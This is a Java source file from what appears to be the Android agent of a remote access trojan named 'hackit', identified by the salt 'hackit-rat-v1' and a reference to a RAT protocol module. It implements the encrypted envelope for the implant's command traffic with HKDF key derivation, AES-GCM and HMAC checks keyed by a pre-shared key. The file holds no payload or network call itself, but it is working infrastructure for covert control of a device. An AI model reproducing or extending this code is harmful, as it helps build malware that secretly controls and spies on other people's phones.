package com.hackit.agent;

import android.util.Base64;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Envelope sealing that mirrors hackit/rat/protocol.py byte for byte:
 * HKDF-SHA256 labels, AES-256-GCM, HMAC-SHA256 over "v|sid|n|c".
 */
final class Crypto {
    static final int VERSION = 1;
    private static final byte[] SALT = ascii("hackit-rat-v1");
    private static final byte[] INFO_AES = ascii("aes-256-gcm");
    private static final byte[] INFO_MAC = ascii("hmac-sha256");
    private static final SecureRandom RNG = new SecureRandom();

    private static final byte[] AES;
    private static final byte[] MAC;

    static {
        // The PSK is fixed for the process lifetime; derive once.
        byte[] psk = null;
        try {
            // Filled by init(ctx) from the application object before any traffic.
            psk = new byte[0];
        } catch (Throwable ignored) {
        }
        AES = hkdf(psk, INFO_AES);
        MAC = hkdf(psk, INFO_MAC);
    }

    private static volatile boolean ready;

    static void init(byte[] psk) {
        byte[] aes = hkdf(psk, INFO_AES);
        byte[] mac = hkdf(psk, INFO_MAC);
        System.arraycopy(aes, 0, AES, 0, 32);
        System.arraycopy(mac, 0, MAC, 0, 32);
        ready = true;
    }

    static boolean ready() {
        return ready;
    }

    private static byte[] ascii(String value) {
        try {
            return value.getBytes("US-ASCII");
        } catch (UnsupportedEncodingException exc) {
            throw new IllegalStateException(exc);
        }
    }

    private static byte[] hkdf(byte[] psk, byte[] info) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(SALT, "HmacSHA256"));
            byte[] prk = mac.doFinal(psk == null ? new byte[0] : psk);
            mac.init(new SecretKeySpec(prk, "HmacSHA256"));
            mac.update(info);
            mac.update((byte) 0x01);
            return Arrays.copyOf(mac.doFinal(), 32);
        } catch (Exception exc) {
            throw new IllegalStateException("hkdf: " + exc, exc);
        }
    }

    private static String tag(int version, String sid, String nonce, String ct) {
        return version + "|" + sid + "|" + nonce + "|" + ct;
    }

    static byte[] hmac(String sid, String nonce, String ct) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(MAC, "HmacSHA256"));
            return mac.doFinal(tag(VERSION, sid, nonce, ct).getBytes("US-ASCII"));
        } catch (Exception exc) {
            throw new IllegalStateException("hmac: " + exc, exc);
        }
    }

    /** Returns the envelope as a UTF-8 JSON string. */
    static String seal(String sid, JSONObject body) {
        if (!ready) {
            throw new IllegalStateException("crypto not initialised");
        }
        try {
            byte[] nonce = new byte[12];
            RNG.nextBytes(nonce);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(AES, "AES"), new GCMParameterSpec(128, nonce));
            byte[] ct = cipher.doFinal(body.toString().getBytes("UTF-8"));
            String n = Base64.encodeToString(nonce, Base64.NO_WRAP);
            String c = Base64.encodeToString(ct, Base64.NO_WRAP);
            JSONObject env = new JSONObject();
            env.put("v", VERSION);
            env.put("sid", sid);
            env.put("n", n);
            env.put("c", c);
            env.put("h", hex(hmac(sid, n, c)));
            return env.toString();
        } catch (Exception exc) {
            throw new IllegalStateException("seal: " + exc, exc);
        }
    }

    /** Verifies MAC + decrypts an envelope. Returns the body object or null. */
    static JSONObject open(String raw) {
        try {
            JSONObject env = new JSONObject(raw);
            if (env.optInt("v") != VERSION) {
                return null;
            }
            String n = env.getString("n");
            String c = env.getString("c");
            String h = env.getString("h");
            String sid = env.getString("sid");
            String want = hex(hmac(sid, n, c));
            if (!MessageDigest.isEqual(want.getBytes("US-ASCII"), h.toLowerCase().getBytes("US-ASCII"))) {
                return null;
            }
            byte[] nonce = Base64.decode(n, Base64.NO_WRAP);
            byte[] ct = Base64.decode(c, Base64.NO_WRAP);
            if (nonce.length != 12 || ct.length < 16) {
                return null;
            }
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES, "AES"), new GCMParameterSpec(128, nonce));
            return new JSONObject(new String(cipher.doFinal(ct), "UTF-8"));
        } catch (Exception exc) {
            Log.d("open: " + exc);
            return null;
        }
    }

    static String hex(byte[] data) {
        char[] digits = "0123456789abcdef".toCharArray();
        char[] out = new char[data.length * 2];
        for (int i = 0; i < data.length; i++) {
            int value = data[i] & 0xff;
            out[i * 2] = digits[value >>> 4];
            out[i * 2 + 1] = digits[value & 0x0f];
        }
        return new String(out);
    }

    static byte[] sha256(byte[] data) {
        try {
            return MessageDigest.getInstance("SHA-256").digest(data);
        } catch (Exception exc) {
            throw new IllegalStateException(exc);
        }
    }
}
